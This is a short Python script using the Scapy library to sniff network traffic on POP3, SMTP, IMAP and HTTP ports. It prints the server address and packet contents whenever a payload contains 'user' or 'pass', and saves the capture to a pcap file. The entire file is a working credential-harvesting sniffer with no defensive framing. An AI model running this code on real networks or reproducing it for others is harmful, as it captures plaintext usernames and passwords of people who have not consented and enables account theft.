from scapy.all import *


#sniff(filter="",iface='any',prn=function,count=N)

def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet=str(packet[TCP].payload)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print("[*]Server:{}".format(packet[IP].dst))
            print("[*]Data:{}".format(packet[IP].payload))

packets=sniff(filter='tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80',prn=packet_callback,count=10000)
wrpcap('data.pcap',packets)
